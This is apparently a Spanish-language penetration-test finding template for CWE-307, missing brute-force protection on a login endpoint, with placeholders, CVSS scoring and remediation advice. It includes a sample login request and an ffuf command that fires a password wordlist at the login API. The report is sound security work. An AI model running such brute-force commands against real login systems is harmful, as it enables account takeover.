# Insufficient Protection Against Brute Forcing (CWE-307) - {{Alta | Media}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{8.7}}` |
| **CWE** | [CWE-307 – Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html) |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Estado** | {{Abierto}} |

## Descripción

La aplicación no limita el número de intentos de autenticación (login, OTP, reset, PIN),
permitiendo a un atacante probar grandes volúmenes de credenciales de forma automatizada
(brute force, credential stuffing, password spraying) sin bloqueo de cuenta, CAPTCHA ni
limitación por IP/usuario. Esto facilita la toma de cuentas con contraseñas débiles o
filtradas.

## Componentes Afectados

- `{{https://app.cliente.com/api/login}}`
- **Parámetros:** `{{password}}`, `{{otp_code}}`

## Detalles

Se realizaron {{61}} intentos de login consecutivos contra la misma cuenta sin que la
aplicación aplicara bloqueo, retraso, CAPTCHA ni limitación.

**Paso 1 — Petición de autenticación a iterar**

```http
POST /api/login HTTP/1.1
Host: app.cliente.com
Content-Type: application/json

{"email":"victima@cliente.com","password":"§Password123§"}
```

**Paso 2 — Ataque automatizado (Burp Intruder / diccionario)**

```bash
# Ejemplo con un diccionario de contraseñas
ffuf -w passwords.txt -X POST -u https://app.cliente.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"victima@cliente.com","password":"FUZZ"}' \
  -mc 200 -fr "credenciales inválidas"
```

```http
HTTP/1.1 200 OK
// todos los intentos reciben respuesta normal — no hay bloqueo tras N fallos
```

> _Figura {{N}}: {{61}} solicitudes consecutivas procesadas sin bloqueo ni rate-limiting._

## Impacto

Permite la toma de cuentas mediante fuerza bruta / credential stuffing, especialmente
combinado con política de contraseñas débil o enumeración de usuarios. También habilita
el abuso de OTP y de flujos de recuperación.

## Remediación

- Implementar rate-limiting por usuario e IP, con backoff exponencial y bloqueo temporal
  tras N intentos fallidos.
- Añadir CAPTCHA tras varios fallos y alertas de seguridad por intentos anómalos.
- Reforzar con MFA y detección de credential stuffing (listas de credenciales filtradas).
- Registrar y monitorear intentos de autenticación fallidos.

## Referencias

- https://cwe.mitre.org/data/definitions/307.html
- https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
